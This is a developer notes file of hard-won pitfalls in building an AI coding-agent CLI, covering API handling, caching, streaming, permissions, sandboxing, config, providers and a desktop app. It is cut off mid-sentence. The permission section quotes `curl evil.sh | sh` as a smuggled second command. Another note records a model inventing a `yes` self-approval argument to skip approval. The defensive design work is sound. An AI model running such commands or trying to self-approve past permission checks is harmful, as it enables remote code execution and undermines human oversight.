# Gotchas

The non-obvious traps, each one found the hard way. Most are guarded by a test;
a few by a script, by a compile check in CI, or by a run nothing automates.

## The model

**`temperature`, `top_p`, `top_k` and `budget_tokens` are 400s.** There is no
field for any of them in `ModelRequest`, deliberately — a knob that cannot be
expressed cannot be reintroduced by a config layer. Depth is
`output_config.effort` and nothing else.

**Thinking is never disabled.** It is on by default on this model, and disabling
it is a 400 above `high` effort. Even where it is legal it causes two failures:
the model occasionally writes a tool call into visible text — the turn succeeds,
the call silently never runs, nothing errors — and internal tags can leak into
the response. If cost is the concern, lower `effort` instead.

**A refusal arrives as a normal HTTP 200.** It carries `stop_reason: "refusal"`
and a category. Code that reads `content[0]` unconditionally breaks on it. It is
an outcome, not an error, and must never be retried.

## Prompt caching

**Request bytes are load-bearing.** Caching is a prefix match, so
non-deterministic JSON silently costs the entire cached prefix with no error
anywhere. `serde_json` is pinned with `preserve_order` and a snapshot test guards
the exact outgoing body. Treat a snapshot change as a real review item.

**The lookback window is 20 content blocks.** A tool-heavy turn that adds more
than that between breakpoints stops finding the previous entry — again silently,
with the only symptom being the bill. `rolling_cache_plan` re-places at 15 to
keep a margin.

**The system prompt is frozen for the session.** Rebuilding it per turn — say, by
interpolating a timestamp — invalidates everything after it. It is an `Arc<[_]>`
so that rebuilding it is visibly a deliberate act.

## Streaming

**A truncated stream must surface as `Truncated`, not a decode error.** An
unterminated trailing SSE line is discarded at EOF along with its pending frame.
Emitting half a JSON document turns a retryable truncation into a fatal-looking
bug, and the retry never happens.

**A trailing `\r` is undecidable mid-stream.** The next chunk may open with `\n`,
so the decoder holds it. At EOF it resolves as a bare-CR terminator. This is the
case the byte-split property test exists for — it re-feeds a recorded fixture
split at every one of its byte boundaries.

**`input_json_delta` fragments are parsed exactly once, at block end.** Each
fragment on its own is an arbitrary slice of a JSON document and is invalid.
`ToolInputAccumulator::parse_count` is exposed so a test can prove the parse
happens once rather than per fragment.

## Protocol

**An internally-tagged newtype variant wrapping a string cannot be serialized.**
`Text(String)` under `#[serde(tag = "...")]` compiles perfectly and fails at
runtime with "cannot serialize tagged newtype variant". Every variant of every
protocol enum is a struct variant, and a test round-trips all of them. A test
that only *constructs* a value proves nothing here.

**Reasoning blocks need their signature.** It is opaque, no surface displays it,
and echoing the text without it is rejected. It is part of the durable record for
that reason alone.

**Every `tool_use` needs exactly one `tool_result`.** A call the loop cannot run
still records why. Two results for one call — from pushing a fresh item instead
of updating the pending one — is equally invalid.

## Paths and process

**Checking the deepest *existing* ancestor is not enough.** A symlink whose
target does not exist cannot be canonicalised, so an ancestor-only check treats
it as "a path being created", falls back to the root, passes — and the write
follows the link out of the workspace. A dangling link is still a real directory
entry. `Workspace::resolve` walks every component and refuses any symlink
resolving outside the root, dangling or not.

**The workspace is wherever it was launched, and that is sometimes a shelf.**
Started in a directory that merely *contains* projects, the root is the whole
tree: a glob walks every repository, takes seconds and returns matches from
unrelated projects, all of which looks like the search working. Nothing is
broken, so nothing would otherwise report anything — hence one line at startup
when the launch directory holds several repositories, and silence when it is
itself one, since a repository with submodules is exactly where someone means
to be.

**A CLI must never block forever on stdin.** With `-p`, stdin is supplementary,
and an inherited-but-idle pipe — a supervisor, a background job, a test harness
that holds it open and never writes — made the process hang with no output at
all. Stdin is now read on a side thread with a bounded wait when a prompt was
given, and blocking only when stdin *is* the prompt. `AXIO_STDIN_WAIT_MS` tunes
the bound.

## Tools and permission

**A call can end before it has a subject.** Three things finish one early — no
such tool, arguments the schema rejects, and a `plan` that fails — and none of
them produces the subject everything downstream identifies a call by. Left
alone, the item reaches the surface with an empty one and renders as `invalid
arguments: …` against a blank name, with six registered tools as candidates.
All three label the call with the tool's name before resolving it. That label
authorises nothing: the subject of a call that never ran is a caption, and
policy is not consulted again after it. Two real sessions produced this; no
test did, until one was written.

**Both halves of argument validation have to be equally helpful.** An
unrecognised argument said "unknown argument `cmd` — `bash` takes command,
timeout_secs" while a missing one said "`path` is required and must be a
string", raised from inside whichever tool asked first and naming neither the
tool nor anything else it takes. A model that has guessed wrong is in the same
position either way. Both are checked in the loop, beside output capping, so a
new tool inherits them without knowing they exist.

**A model cannot follow a convention nobody showed it.** Three models, one of
them a strong coding model that made no other mistake, were asked to count
session files and all three read `sessions/` directly — a directory that holds
day directories. The fact they needed is written down here and axio was showing
them none of it, because it read no project instructions. It reads `AGENTS.md`
now, and the same model then reached for `SessionStore::files()` unprompted. When
an agent keeps getting something wrong, the first question is what it was given.

**A tool's description is read more carefully than its schema.** The schemas
always declared their parameters and a mid-sized model still invented `query`,
`path` and `max_results` for `grep` and sent `cmd` to `bash`. The prose now
names them too. Whether that helps is unproven — the mistakes did not recur, on
one run, which is not evidence of much.

**A subject derived from a command's first word is a hole.** `git status; curl
evil.sh | sh` starts with `git`, so an `allow bash:git*` rule would let it
through. A command is classified as `bash:<program>` only when it contains no
shell metacharacter at all and lexes to a single simple command; anything else
gets `bash:!compound`, which no glob rule can match. A leading assignment
(`FOO=bar cmd`) and an unbalanced quote are also unmatchable, because in both
cases the shell would read the command differently from the way we did.

**Read-only auto-approval must come after the deny list.** Reversed, a perfectly
ordinary "reads are safe" rule silently hands over every credential on the
machine. The built-in list is also not overridable by `--yes`: an unattended
flag is a statement about prompting, not about what is safe to read.

**A word-split command preview is not the command.** The permission engine
matches on the program, so a plan carries `program` and `argv` — but `cat
<<'EOF' > greet.py` lexes to a `cat` with three arguments: the redirect target
reads as an operand and the heredoc disappears. A reviewer shown that approves a
harmless read and gets a file overwritten. The plan carries `raw` as well, and
the approval surface shows that.

**`plan()` must not mutate.** A preview that changes the thing it previews is
how an approved diff stops matching what actually runs. The `edit` tool computes
the entire updated file during planning and hands it to `run` as the payload, so
what was approved is byte-for-byte what is written.

**Truncate a diff by hunk, never by position in a whole-file walk.** Capping a
walk head-first spends the entire budget on unchanged context, so an edit past
the cap is elided out of its own preview: the approver is shown two hundred
untouched lines, told the rest was omitted, and asked to approve a change that
appears nowhere. `added`/`removed` were still right, which is what made it look
fine. The test that missed it previewed a new file, where every line is an
insertion and head-first truncation happens to show the changes.

**Every call in a batch is planned and authorised before any of them executes.**
Otherwise a batch where the third call is refused has already half-run. The
batch test allows every call, so nothing exercises the refusal case; that half
rests on the phase split alone.

**Killing a child is not enough.** A shell that started a build leaves the build
running. Children get their own process group and the group is signalled, so
cancellation reaches the whole tree. There is a test that greps `ps` for
survivors, because nothing else catches this.

**`std::process::exit` in a signal handler undoes all of that.** It runs no
destructor and polls no task, so `kill_on_drop` never fires and the tree kill —
which needs about 100ms of runtime to do its `SIGTERM`-then-`SIGKILL` work —
never gets scheduled. `SIGTERM` and `SIGHUP` therefore cancel and let the
runtime unwind, on a deadline, rather than exiting where the signal is seen. The
in-process cancellation test cannot catch this: it exercises the path that
works. The signal tests spawn the real binary and send it a real signal.

**A guarantee that matches lowercase patterns against the model's own spelling
is off by one capital letter.** The built-in deny list is all lowercase and the
subject is built from the argument as given, so `read .ENV` resolved to the real
file on macOS and Windows and matched nothing. The built-in test is case-folded;
user rules are not, because their author should be able to predict exactly what
they cover.

**A refusal that does not say what was wrong with the request gets retried.**
Told `.env` was on the protected list, the model adapted on the first try. Told
only that approval was needed, it re-sent `echo one; echo two` three times — the
adaptation it needed (split the compound into two simple calls) was not
discoverable from the message. Denials name the classification, and a subject
already refused this turn is answered from the record rather than asked about
again.

**A declared contract nobody enforces cannot correct anything.** Every tool
schema said `additionalProperties: false` and nothing checked it, so a model
that invented `"yes": true` — a self-approval argument it hoped existed — was
never contradicted and sent it for the rest of the session. Checked once in the
loop, not in each tool.

**"No matches" is a claim; an error is an answer.** `glob` and `grep` walk from
the workspace root, so a pattern pointing outside it used to come back empty —
which the model believes, so it keeps searching. They now refuse the pattern in
the same words `read` uses.

**A byte count cannot be turned into a line offset.** The truncation marker
reported omitted *bytes* while `read` takes a *line* number, so the only safe
move was `offset: 1` — re-injecting the head already in context, at exactly the
moment the output was declared too big. The marker names the line to resume at.

**`reqwest`'s `Display` prints only its outermost layer.** "builder error" with
the cause dropped, retried three times on the full backoff schedule, for a base
URL that could never parse. Causes are walked, and a builder or connect failure
is a `Configuration` error, which is not retryable.

**An error body goes to the terminal and, on a recorded run, to the session
file.** Uncapped, an SSO login page or a corporate proxy error is hundreds of
kilobytes of noise, and the one useful fact — that the response was not JSON, so
the endpoint is probably not an API — was the thing it did not say.

**A `fallback` content block has no deltas.** A server-side fallback response
opens one at each model boundary, as a start/stop pair with nothing between.
Mapped to text — the sensible default for an unknown block type — it becomes an
empty assistant message that is then echoed back on every later request.

**A spend cap nothing can measure is not a cap.** The unpriced providers report
zero for every token, so `max_usd_per_turn` compared against `0.0` forever. It
is silently inert, which is the worst outcome for a guardrail: the user believes
they set one. Announced as a warning at startup.

**A denial the user never sees is worse than a failure.** Policy refuses, the
session records it, `--json` carries it — and if the plain renderer drops the
event, the model's confident summary is the only thing anyone reads. The
renderer prints every terminal tool status on stderr, and a completed turn with
refusals exits `5`, because prose is not something `&&` can inspect.

**A subject cannot classify what a shell command reads.** `bash:cat` is the
program name; the built-in deny list matches paths. A plan carries the paths its
arguments name so the two meet. Quoting and separators are stripped first, so
`cat ".env"` and `ls; cat .env` are both seen — but a computed path is not, and
the docs say so rather than implying a guarantee that does not hold.

**A spill file named for anything but its call id will be overwritten.** Two
large outputs in one session otherwise land on the same path, and the first
call's recorded marker goes on promising content the second one replaced. The
failure is not a missing file — which the model would notice — but a file
quietly holding a different command's output.

**A truncation marker that names an unreachable path is worse than no marker.**
The spill directory is outside the workspace and `resolve` refuses every
absolute path, so `read` on the path the marker names was rejected outright.
`resolve_readable` exists for exactly this one case, for reads only.

**`creation_flags` is inherent on tokio's `Command`.** Importing
`std::os::windows::process::CommandExt` to reach it leaves an unused import,
which fails clippy at `-D warnings` on Windows and on no other platform — so it
passes locally and breaks in CI. This one was written down here *before* it was
made, and made anyway.

**Gating a test with `#[cfg(unix)]` orphans its imports.** The imports only that
test used become unused on every other platform, and clippy at `-D warnings`
rejects them — so the fix for one Windows failure produces the next one. Gate the
imports alongside the tests, and run `scripts/check-windows.sh`, which catches
this whole class without a CI round-trip.

**`CREATE_NO_WINDOW` is deliberately not set on Windows.** It belongs to a GUI
application spawning a console child. In a console application it detaches the
child, breaking anything that checks whether it is attached to a terminal.

**Output truncation lives in the loop, not in the tools.** A tool that forgets
puts ten megabytes into the next request and nothing errors.

## The interactive surface

**Two readers of stdin fight over the terminal's replies.** An inline viewport
asks the terminal where the cursor is, and reads the answer from stdin — which
the key handler is already reading. The reply gets delivered to the wrong
reader, the query times out, and the interface dies with "the cursor position
could not be read". Enabling `scrolling-regions` removes the query. The failure
needs a real terminal to appear at all, which is why it was found by driving the
binary through a pty rather than by any test in the suite.

**A feature that is off is a different compilation.** A field only the
interactive surface reads is dead code in the headless build — a warning, which
CI turns into an error with `RUSTFLAGS: -D warnings` and a plain local build
does not. `scripts/features.sh` builds both sets with CI's flag, because the gap
was exactly one flag wide and it cost a red build.

**An asterisk is arithmetic more often than it is emphasis.** `2 * 3 * 4` has a
pair of asterisks in it, and a renderer that simply looks for the next one turns
the line into "2 3 4" with the middle in italics — a wrong number, presented
confidently, from a renderer nobody was watching. A marker only opens emphasis
when it is glued to the text after it and only closes when it is glued to the
text before it. The same reasoning covers `snake_case_name`: a single underscore
inside a word is part of an identifier, not the start of italics.

**Rendered text is committed as soon as its line ends.** Nothing can be
unprinted from scrollback afterwards, so a retry after a dropped stream says the
text above may repeat rather than pretending it will not. Rendering a message
line by line and rendering it whole must produce identical output or a resumed
transcript would not match what was watched live; that equivalence is a test,
and an open code fence is the only state allowed to cross a line boundary.

**syntect's default regex engine is a C library.** `regex-onig` pulls in
oniguruma and therefore a C toolchain, which is exactly what installing on a
clean Windows machine is promised not to need. `default-features = false` plus
`regex-fancy` is pure Rust and keeps that promise; `cargo tree` finding `onig`
means a default feature crept back in.

**A scope op opens the region it is paired with.** `ScopeRegionIterator` yields
`(text, op)`, and the op has to be applied *before* the text is styled. Reversed,
every run takes the colour of the one before it: `fn` renders plain and the
space after it renders as a keyword. It looks like an off-by-one in the colour
table rather than in the loop, which is what makes it worth writing down.

**Killing a process tree is a different problem on Windows.** There is no
process group to signal, and a job object — the tidy answer — has to be assigned
at spawn time to capture anything, because a process joins a job only before it
has children. By the time a kill is wanted the grandchildren already exist, so
the kill walks the tree with `taskkill /T /F` instead. Only the unix half has an
automated orphan test; the Windows half is verified by construction. A
`windows-sys` dependency with the job-object features sat in the manifest unused
for exactly this reason — the design was written down and never built, and
nothing failed, because the only test for it was `#[cfg(unix)]`.

**A character is not a column.** An ideograph or an emoji occupies two columns
and counts as one character, and a combining mark occupies none. Wrapping by
character count writes those lines wider than they were measured, and the
terminal clips what does not fit — silently, at the right-hand edge, which is
where the reader is least likely to notice a word has gone. Widths come from
ratatui's own text measurement so the renderer and the terminal agree.

**Without bracketed paste, a pasted paragraph is a series of keystrokes.** Its
first newline submits it and the rest types itself into whatever the surface
does next — an approval prompt, if the timing is unlucky. `EnableBracketedPaste`
turns it into one event, and it has to be disabled again on the way out, panic
included, or the sequence leaks into the user's shell.

**Shift-enter is not a key every terminal reports.** Without the keyboard
enhancement protocol many terminals send a plain `Enter` for it, so a surface
that only binds the modified key has no way to enter a second line there.
`Ctrl-J` is the fallback, and paste covers the case that actually matters.

**An emulator is not a terminal.** Driving the binary through a pty and replaying
its bytes catches a great deal, but the emulator has to implement what ratatui
emits: `pyte` supports `DECSTBM` and not `CSI S`/`CSI T`, so scroll-region moves
are silently dropped and the replay shows ghost rows that no real terminal
shows. Rendering and input can be trusted from that harness; scrolling cannot.

**A key event fires on release too, on Windows.** Filtering to
`KeyEventKind::Press` is the difference between one character and two. It is one
guard in the key reader, and nothing in the suite asserts it.

**Restore the terminal from a panic hook.** A panic in raw mode leaves the user
with no echo and no line discipline: they have to type `reset` blind, without
seeing what they type. The hook runs before the default one so the message is
still readable when it arrives. Like everything else that touches raw mode it is
unreachable from the suite — a test that installs a hook installs it for every
test after.

**The viewport's height is the menu's height, and it cannot change.** An inline
viewport is sized when the terminal is created and ratatui offers no setter;
`Terminal::resize` recomputes the origin from the height already stored. So
`VIEWPORT_ROWS` minus the composer's frame and the status bar is exactly what
every overlay gets, and a list longer than that silently shows part of itself.
It was seven, chosen when the slash menu had three commands and the only
provider list was three long; both outgrew it, and the symptom was a menu that
displayed half of itself. Anything that adds a command or a provider is changing
the size of a fixed area — the tests iterate the real lists so it fails there
rather than on screen.

**A list that overflows must window around the selection, never trim from one
end.** The credential form drew every provider and then dropped the excess from
the front, so the question and the first entries scrolled off the top and the
highlight could sit on a row that was no longer drawn. Trimming the *tail* is
right for a streaming answer, where the newest line is the one to keep, and
wrong for a list, where the selected row is.

## The sandbox

**A hand-written list of credential variables protects the provider its author
had in mind.** `ANTHROPIC_API_KEY` was stripped from every child environment and
`OLLAMA_API_KEY` — the credential for two of the three provider names — was not,
so a shell command inherited it verbatim. The list is derived from the providers
themselves, so adding one cannot leave its key behind.

**`AccessFs::from_file` is every right a file can carry, including write.**
Substituting it for a *read* grant on a regular file made `~/.gitconfig`
writable under the sandbox, and a writable git config is `core.hooksPath`
pointing wherever it likes. Narrow by intersection, never by substitution.

**A Landlock domain belongs to a thread, not a process.** Applying one on a
tokio worker restricts that worker and nothing else — and the command runs on a
different one. The symptom is the worst available: a sandbox that reports itself
applied and confines nothing. It is applied before the runtime is built, where
there is one thread and every later thread inherits it.

**Directory rights on a regular file downgrade the whole ruleset.** `ReadDir` on
`~/.gitconfig` cannot be honoured, so the kernel enforces a reduced ruleset and
`restrict_self` comes back `PartiallyEnforced` — for every path, not just that
one. The rights have to match what the path actually is.

**A Linux-only variant is dead code everywhere else.** `-D warnings` makes that
an error on macOS and Windows, and `scripts/check-windows.sh` cannot see it: the
binary crate cannot be cross-checked locally because it pulls in `ring`, whose
build script wants a C toolchain for the target. Anything behind
`cfg(target_os)` in `crates/axio` is checked by CI alone.

**Nothing spawns without `/proc` and `/dev`.** The standard library closes
inherited descriptors through `/proc`, and `Stdio::null()` opens `/dev/null`.
Grant the rest of the system and forget these two and every command fails with
"could not start a shell: permission denied" before it has run.

## Sessions, config and compaction

**One file must not be two layers.** The user's configuration lives in
`~/.axio/config.toml` and a project's in `<project>/.axio/config.toml` — the
same directory name — so the walk that looks for a project config finds the
user's own on the way up from anywhere beneath the home directory, and loads it
a second time as a layer that may only *restrict*. A person's settings coming
back as a restricted copy of themselves, and only on the machines where they
work under `$HOME`. The lookup is given the user's path and refuses to return
it; the check is on the path rather than the boundary because `AXIO_HOME` can
put it anywhere.

**A configuration file is something a person wrote.** Serialising `Config` back
out is a few lines and deletes every comment, the ordering, the blank lines and
every section axio does not use. Writing a default is a line edit that touches
two keys and leaves every other byte alone — and it has to know that `provider`
under `[voice]` is not `provider` under `[model]`, which a previous generation
of this file would have proved the hard way.

**A default must never be saved at the moment it is chosen.** The model name is
not checked until the next request, so choosing is not knowing. It is written
once a turn has come back with an outcome that could not have happened unless
the endpoint accepted the request — a refusal counts, since it arrives as a
normal 200; an interrupt does not, since the turn may have been stopped before
the first byte.

**"Not mine" and "mine and broken" cannot share an answer.** One predicate
returned `false` for both, and the caller could only read the second — so every
unrecognised section became damage, and damage means a backup, which means
writing into a directory axio was only supposed to read. Someone ran the binary
against a `.axio/config.toml` belonging to a different tool and got
thirty-three warnings and a `.corrupt-<ts>` copy of a perfectly healthy file.
The comment above the predicate had said unknown sections should be dropped
silently the whole time; the code had never done it. When one function answers
two questions, the caller gets whichever answer the author was thinking about.

**A derived `Default` on the permission engine would empty the built-in deny
lists.** They are ordinary fields, populated only by `Policy::new`, so a derived
`Default` yields a policy with no built-in denies at all — and read-only effects
are auto-approved as soon as the deny lists have had their say, so that policy
hands over every credential on the machine. It is one `..Default::default()`
away at all times and nothing in the type signals it, so `Default` delegates to
`new` and the safe construction is the only construction.

**A context-elision marker must never be persisted.** It describes the
in-memory projection, not the history. The file still holds every item it claims
was removed, so writing one is a lie about that file — and because the file is
append-only, every subsequent resume appends another.

**`#[serde(default = "…")]` fires on a missing *field*, never on a missing
*table*.** So a derived `Default` yields `false` for a bool documented as
`true`, and the only symptom is a feature quietly switching itself off for
everyone who never wrote that section. Any struct with a non-false default gets
a hand-written `impl Default`. There is a named regression test.

**A project config may only restrict.** `[permissions] allow` from a project
file is dropped with a notice. Granting from a file that arrives with a `git
clone` is remote code execution by `cd`.

**A backup on every load is not salvage, it is litter.** The `.corrupt-<ts>`
copy is written only when a section was actually lost.

**Per-section salvage protects files and does nothing for the environment
layer.** An environment variable merges a raw string into the table, so one typo
in `AXIO_EFFORT` failed the whole-config deserialise and fell back to
`Config::default()` — discarding the model, the provider, and the budget limits
in a section the typo never touched. Every env value is now validated against
its own section before it merges, the same way a file's is. The symptom was not
a config error: it was "no credential for `anthropic`" shown to someone who had
selected `ollama` on that very command line.

**A notice nobody reaches explains nothing.** Config notices are replayed
through `announce`, which is downstream of building the provider — so the one
notice that explains a failed credential lookup was unreachable on exactly the
run it described. The failure path prints them itself.

**Compaction must be pure.** If it depended on anything but the transcript, a
resumed session would compact at a different point than the original and the
request would diverge — silently, because both are valid.

**A prefix drop clamped to the most recent user message will never fire when
that message is index 0.** The clamp exists so the *current* prompt survives;
when the only prompt is the opening one it is already protected separately, so
clamping there blocks stage three exactly when a long single turn needs it.

**Do not clamp a prefix drop to avoid orphaning tool results.** One `ToolCall`
item carries both halves of the pairing, so dropping whole items cannot orphan
anything — and a loop that skips forward over tool calls will, in a tool-heavy
transcript, skip to the end and never cut at all.

**Usage reports are cumulative, not incremental.** `message_start` and
`message_delta` each carry the running total for the same message, so summing
them double-counts the input tokens. The only symptom is the invoice.

## Testing

**A test suite that reads the user's real configuration passes in CI and fails
on a configured machine.** The CLI tests cleared two environment variables and
believed that made them independent; they still read the real `AXIO_HOME`, so
the moment anyone ran `axio auth login` five of them failed — and one proceeded
far enough to make a real, billed network call. Every test now points at an
empty temporary home and state directory. Found by dogfooding, not by CI, which
has no configuration to be confused by.

**If an environment variable relocates a home directory, it must relocate
everything in it.** `AXIO_HOME` moved the credential file but not the config
file, so isolation was half-applied and `--doctor` reported a home that only
some things lived in. The credential half has a test; the config half rests on
`config_file_path` deriving from the same `axio_home`, and on nothing else.

## Credentials

**An empty stdin and an empty answer are different failures.** A credential
prompt reading from `/dev/null` — a CI step, a task runner, an editor's
terminal — gets EOF, not a blank line, and the advice for each is completely
different. Found by running the command, not by testing it.

**A credential must never be a command-line argument.** argv is visible in `ps`
to every user on the machine, and lands in shell history besides. `auth login`
reads stdin.

**Set the file mode at creation, not afterwards.** Creating world-readable and
chmodding leaves a window in which the credential is exposed.

**axio's own home must be denied to axio's own tools.** Run from a parent
directory, `auth.json` is inside the workspace and the `read` tool can hand the
key to the model. The deny is built-in, so no allow rule and no `--yes` reaches
past it.

**Claiming file protection on a platform that has none is worse than claiming
nothing.** Windows gets an honest note instead of a false guarantee.

**A credential typed into the surface must not reach scrollback.** Scrollback
is the terminal's, not the process's: it survives the exit, scrolls and copies.
Everything else the surface prints is meant to end up there, which makes it the
one destination a credential flow has to opt out of rather than into. Only the
character count is drawn.

**A pasted credential arrives with the newline it was copied with.** Keeping it
produces an authentication failure that looks like a wrong key and is really a
wrong paste — control characters are stripped on the way in.

**Storing a credential does not change the session that stored it.** The
provider was constructed with whatever existed when the session opened, and
says so on saving. Silence there invites the reasonable conclusion that the new
key is now in use, and the next failure is then attributed to the key rather
than to the session.

## Providers

**A model catalogue in the binary can be wrong the day it is written.** Not
just stale — wrong immediately. Three names were compiled in for the
subscription endpoint on the reasoning that it published no listing; it
publishes one, and it serves none of those three. Nothing would have said so
until someone picked a name and got a 404. The listing needs
`?client_version=`, and it *filters* on it: each model declares a minimum and
axio's own version returns an empty catalog, so the value sent is one that does
not filter and the real filtering is done on what each model says about itself
(`visibility`, `supported_in_api`).

**A model catalogue in the binary is wrong the first time either side ships a
model, and wrong invisibly.** A name missing from a compiled-in list is
indistinguishable from a name the provider refuses. Both dialects publish
`/models`, so the list is asked for. The Messages dialect is configured with
the full path to `/v1/messages`, so its listing is the *sibling* of that path —
appending asks for `/v1/messages/models` and gets a 404 that reads as "this
provider has no listing".

**In the Responses dialect a tool is flat, and a nested one is never called.**
`{type, name, description, parameters}` at the top level; wrapping it under
`function`, as the chat-completions dialect requires, is accepted and silently
ignored. `store` must be `false` there too — the endpoint answers "Store must
be set to false" — and the system prompt is `instructions`, a field, not a
message with a role.

**Answer a tool call with its `call_id`, not the item `id`.** The item id names
the output item; a result carrying it is one the model cannot match to the call
it made, and the turn continues as though the tool never ran.

**`WireMessage` is Messages-API-shaped.** One user message carrying N
`tool_result`s is correct there and invalid in the chat-completions dialect,
where each result is a separate `role: "tool"` message. The split belongs in the
provider; anything above the trait must not learn about it.

**Tool arguments are a JSON *string* in that dialect, not an object.** Sending
an object is silently wrong rather than an error.

**A dialect with no equivalent for a feature should drop it, not approximate
it.** Reasoning blocks have no counterpart, so they are omitted. An invented
mapping would be worse than an absent one.

**"No equivalent" is a claim about the endpoint, and the endpoint can be
asked.** Effort was dropped here for a while on the belief that the
chat-completions dialect had nothing to map it onto. It has
`reasoning_effort`, and the way to find out cost one request: an invalid value
returns a 400 naming every value it accepts, while a field the endpoint has
genuinely never heard of is accepted in silence. That asymmetry distinguishes
"ignored" from "unsupported" for any field, and neither can be told from the
other by reading documentation. A dropped setting fails silently in the
direction nobody checks — the request still succeeds, and only the depth is
missing.

**A provider that cannot price itself must report zero, not a guess.** A
made-up price makes the budget check silently wrong; a zero makes it visibly
absent.

## Dependencies

**reqwest's default rustls provider needs a C toolchain on Windows.** The default
is `aws-lc-rs`, whose `-sys` crate wants CMake and NASM on x86-64 — a
`cargo install` failure on the platform least able to absorb one. We take
`rustls-no-provider` and install `ring` ourselves behind a `Once`.

**`json` and `stream` are not default features of reqwest 0.13.** They must be
named explicitly.

**An HTTP client carrying a credential must not follow redirects.** The default
is to follow up to ten, re-sending the auth header and the full body to whatever
host the hop names. Redirects are refused outright.

**Redaction is an invariant, not a variant.** Every error carrying
provider-supplied text carries it as `Redacted`. A 401 or 403 body is the
response most likely to quote back what was sent.

## Reading other programs' numbers

These apply to `axio-quota` and `axio-cost`, which differ from everything above
in one way that generates most of the traps: **the formats are not ours and are
mostly undocumented.** A parser here is reading something written for its
author's own use, and every assumption fails silently.

**Never `#[derive(Deserialize)]` over a whole provider payload.** Parse into
`serde_json::Value` and pick fields by name. Provider APIs send numbers as
strings and add fields without notice; a strict decode turns that into an
outage. A live payload proved it within an hour: `"balance": "0"`, a string.

**A response with no parseable figure is an error, never a zero.** "Nothing
left" and "we could not tell" must not render the same. An early build summed
the one message in 77,525 whose model it knew and printed `$0.30` next to a
vendor's name.

**Do not guess one spelling of an undocumented field.** These responses are
whatever a site's own server function returns; one endpoint carries eight
spellings of the percentage and eight of the reset countdown. Try the list. When
nothing matches, report the identifier-like keys the response actually
contained — **names only, never values**, because these payloads carry account
emails. A parser that fails silently on an undocumented shape is one nobody can
fix; one that names the fields it saw can be fixed from a screenshot.

**Bound the search window around a label when lifting a figure out of a
document.** Unbounded, a rolling window with no percentage silently reports the
weekly one's, and a scraped page borrows an unrelated number from further down.
An unrecognised layout is an error rather than a guess: the page will change,
and a number that is not usage is worse than no number.

**Reset stamps disagree on their unit across vendors.** Claude's `expiresAt` is
milliseconds, Codex's `reset_at` is seconds, z.ai's is milliseconds. Read
milliseconds as seconds and the timestamp lands in 1970, which renders as a
window that is permanently resetting.

**A percentage below one is still a percentage.** `0.36` means 0.36%. Read as a
fraction it turns a reading the dashboard rounds to zero into a third of the
plan.

**Currencies are not summable and unit codes are not stable.** A balance
reported per currency takes one, never a sum — adding CNY to USD produces a
number that is not money in any currency. A vendor's unit vocabulary gains
entries, so an unrecognised unit keeps its percentage under a vague label rather
than being dropped: the one dropped could be the one about to run out.

**Reasoning tokens are not counted the same way twice.** One agent's own total
proves `total = input + output + reasoning + cache.read` — reasoning *added* to
output — where another contains reasoning within output. `TokenBreakdown` holds
it as a subset, so a parser for the first convention folds it in. Mapped
straight across, one observed message carrying 9,459 reasoning tokens against
171 of output would have read 98% short.

**Cache tokens as a multiple of fresh input cannot be compared across vendors.**
OpenAI counts the whole prompt as input, Anthropic counts only what missed
cache, so the same column read 31x for one model and 121,077x for another. As a
*share of the row's tokens* it means the same thing whoever reported it.

**A shading ramp scaled against the busiest day says nothing.** With a peak
thirty times the median, linear puts nearly every day in the lowest bucket and
logarithmic puts nearly every day in the highest. Quartiles of the active days
compare a day to a typical day, which is what someone reading their own calendar
means.

**Every date here is UTC and says so.** Converting to local time moves messages
across midnight and silently changes a streak depending on where the machine is.

**Do not key a series by joining fields and splitting the string back.** Joining
provider and window label on a space truncated every label containing one:
`Weekly (Fable)` became a second `Weekly` charted against the wrong data, and
`GPT-5.3-Codex-Spark Weekly` matched nothing and vanished. Group on the pair.

**Send our own User-Agent.** Presenting another client's identifier to a
vendor's endpoint is outside what a third-party client is authorised to do.
`scripts/firewall.sh` fails the build if one returns to `crates/`.

**Quota's config is a different file from axio's own credential store, and both
are called `auth.json`.** `axio_core::auth` writes axio's; `axio-quota` reads
the ones other tools wrote. Debug-level logs contain the raw provider response,
including account id and email.

## The desktop app

**A Tauri command declared `fn` rather than `async fn` runs on the main
thread** — which is also the thread that paints and handles input. One keyword
froze the window for the length of a scan, and because the command held a mutex
throughout, the second view queued behind the first and froze again. Nothing
that can be slow runs on a caller's thread.

**`Webview::cookies` posts a message to the event loop and blocks on the
reply.** Calling it from a synchronous command deadlocks — Tauri documents this
and the first version ignored it. Building a webview waits on the event loop for
the same reason, so *opening* a window from a synchronous command hangs too.

**Tauri v2 denies a permission that no `capabilities/` file grants, silently.**
No error, no warning: the frameless window simply did not move, while the
minimise and close buttons kept working because Rust-side calls bypass the
permission layer entirely — which made one bug look like two unrelated ones.

**A window showing a third party's sign-in form must be decorated, and must not
be listed in `capabilities/default.json`.** Undecorated, someone else's password
form appears inside chrome that looks like ours, which is the shape of a
phishing screen. Listed, a remote page reaches axio's command surface.

**A cookie's name is not proof that anyone signed in.** One provider sets a
cookie called `auth` while its OAuth handshake is still in flight, so a
name-only check captured a pre-sign-in artifact, saved it and closed the window
with nobody signed in. Use the candidate once against the provider's own
endpoint and accept only what authenticates — and treat *only* Unauthorized as
keep-waiting, since a missing workspace or a network blip both mean the session
was recognised, which is the one thing being established.

**Poll by waiting for each answer, never on a timer.** A check slower than the
interval stacks another on top of a page still loading.

**Refreshes pile up from more places than the schedule.** Saving settings
triggers one, so does capturing a sign-in, so does the button — and under a run
of edits those became a burst against an endpoint that rate limits, which the
view then reported as the *vendor* rate limiting us. A throttle collapses the
burst; an explicit Refresh press bypasses it, because someone pressing it is
asking a question the throttle would otherwise decline to answer silently.

**A source file can contain NUL bytes and git will call it binary.** Two of them
got into a stylesheet through an editing pipeline that wrote a separator
character as a real byte rather than as source text, and the only symptom was
git refusing to diff the file. No other tracked source file has any.

## Supervised sessions

**A ULID orders by time only across milliseconds.** Its first ten characters are
the timestamp and the rest is random, so two ids minted in the same millisecond
sort arbitrarily — and a queue of agents starts sessions in the same millisecond
as a matter of course. The session index therefore holds file order rather than
id order, and a worktree's branch carries the whole ULID rather than a readable
prefix. Sorting a list of sessions by id looks correct in every test with a sleep
in it and is wrong in the case the feature exists for.

**Record a worktree's path exactly as git was given it.** git registers a
worktree under the string it was handed, and on Windows `canonicalize` returns
the `\?\` extended-length form — a different string, so `worktree remove` fails
to match its own registration and every closed session leaks a directory.
`Workspace` canonicalises for confinement on its own, so nothing downstream needs
the real path.

**An approval queue cannot be shut down by dropping it.** Every session's
approver holds an `Arc` to it, so it outlives the supervisor by construction, and
